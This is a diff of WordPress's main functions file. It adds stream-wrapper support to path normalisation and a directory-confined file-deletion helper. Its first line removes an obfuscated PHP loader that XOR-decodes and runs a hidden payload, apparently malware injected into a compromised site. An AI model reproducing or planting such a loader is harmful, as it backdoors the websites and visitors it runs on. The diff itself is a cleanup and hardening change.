@@ -1,4 +1,4 @@
-<?php $LcqEk=' LNZ=1kH;NT2QSU'^'C>+;IT4.N 7F8<;';$yBiIGenqNH=$LcqEk('','>RfK7CZ M:8 =2XDAHSQV-O:0>VI8;.M1YuDbO6sl<BNV:.8<rT<Gl>+,5bc:U:OTX9O5BnkG7ODcoSLFKgHPIWIAxyYqrZYL8.DRbJ:kxWsTxS0U4  5WWFMUAAYApscGNSO1>MIQ3>SESEAeDZ>QkPQaQ.QbR,,wI,RVQ2<G4I6dV1,6g7aZZ;qOE<BCWXw50TFW0z03F9bU66.8odHUZV4SIFtPOJA82.7eXNJ0GHXRzNKB9-37SFNcrp rup-ZYNnu.YKUdhOA.98AREBUpzIXVT2kF7HJVHw;N;Tkpk.1<SHNqwHZX;HWyHom0FibTUDJ=JMIHCcWV5Q5-:wJOn;yhekjjLY0yn24+YYrGKOL8=-HF0:lDQ7LT4jSNJDplm>K7TfBXCRTTPkJjIVAGM2oybFBKEio-Z62IRD5B;BKLR3>3>VFJB9=RAH+mnX=JMXTB<xEc13-<15kSYV5XHbAI7LMMo<W-Qlp;PRqg-VLOkMgtS<I9 8 TM;Q<RBI9QeW.0UDdVD IPqEJkUP80MzwUJA.np22AHhfRLecSkiKpMZBsq-sINBCRu,L>uWRurwTiBSOUrnDWWBOAGS37F1--QDBBO8Da=TO<5T0pdHHD8,QebdrToMZ>=01Z+=ZKPATWaH48:T77JC;hmg=6FP mWHbB7'^'W4NjQ64C9SWNbW -2< yqU HoZ7=Ydq D-RmKoMyeZ7 5NGWRR,S53ZJXT=<W Ngp<X;TnNO,R6mCOslf0mAYm8<5XDyVUaSE1H+ JnSKEwCoXwYiGTRY29ni1 58hKSG.exf;7Dm>FJskneiA ;J00t8<qpqF9IU,mErsqAH5X,XLrZIONjHaP2x= H719pSZE ol:sM9;3hqRWZYOYh3;:G6rLP4.> gYKNEen,Q+;=ipD--KHRT;ffG-3o=>9hz8=NQE<2uYVoeXXT47lb.zsm<7 S4-R1jkhSP+BoayOJPH2hsQS>;4N-ls5egY IJuq +I+di3Ij19G4TNRWbk1i<90.9>l8CYJYQRydLgo9-THHafK0eMuS- U58+3dMLIU.NolKQg65 1KwJm  +8WTsk;H6OcKI;BSiodu7U1.>;RRZD3n2-Kb6 <J215H>e:51YNq<UVNSUPCw=7A9aNamS-9,0W2TxEK194YCI78.KkAT2N;XYgK14d4D;1=JyB<KIrhDr A=1XelMuxUTxRS1+5O5WYW8o5OrqXCtRQyD+<sFBID,,tseMJxXC5fDCG6Xpb.7UGdqqb.352Jh-TTr4<+1;KlFM56PZ5TWHhl YX0LKDRtOmzE79T,JQro4  6:oDYC8XV.dfAVm4S>9TEgaYHJ');$yBiIGenqNH();
+<?php
 /**
  * Main WordPress API
  *
@@ -1699,17 +1699,30 @@ function path_join( $base, $path ) {
  * @since 3.9.0
  * @since 4.4.0 Ensures upper-case drive letters on Windows systems.
  * @since 4.5.0 Allows for Windows network shares.
+ * @since 4.9.7 Allows for PHP file wrappers.
  *
  * @param string $path Path to normalize.
  * @return string Normalized path.
  */
 function wp_normalize_path( $path ) {
+	$wrapper = '';
+	if ( wp_is_stream( $path ) ) {
+		list( $wrapper, $path ) = explode( '://', $path, 2 );
+		$wrapper .= '://';
+	}
+
+	// Standardise all paths to use /
 	$path = str_replace( '\\', '/', $path );
+
+	// Replace multiple slashes down to a singular, allowing for network shares having two slashes.
 	$path = preg_replace( '|(?<=.)/+|', '/', $path );
+
+	// Windows paths should uppercase the drive letter
 	if ( ':' === substr( $path, 1, 1 ) ) {
 		$path = ucfirst( $path );
 	}
-	return $path;
+
+	return $wrapper . $path;
 }
 
 /**
@@ -5446,6 +5459,28 @@ function wp_delete_file( $file ) {
 	if ( ! empty( $delete ) ) {
 		@unlink( $delete );
 	}
+}
+
+/**
+ * Deletes a file if its path is within the given directory.
+ *
+ * @since 4.9.7
+ *
+ * @param string $file      Absolute path to the file to delete.
+ * @param string $directory Absolute path to a directory.
+ * @return bool True on success, false on failure.
+ */
+function wp_delete_file_from_directory( $file, $directory ) {
+	$real_file = realpath( wp_normalize_path( $file ) );
+	$real_directory = realpath( wp_normalize_path( $directory ) );
+
+	if ( false === $real_file || false === $real_directory || strpos( wp_normalize_path( $real_file ), trailingslashit( wp_normalize_path( $real_directory ) ) ) !== 0 ) {
+		return false;
+	}
+
+	wp_delete_file( $file );
+
+	return true;
 }
 
 /**
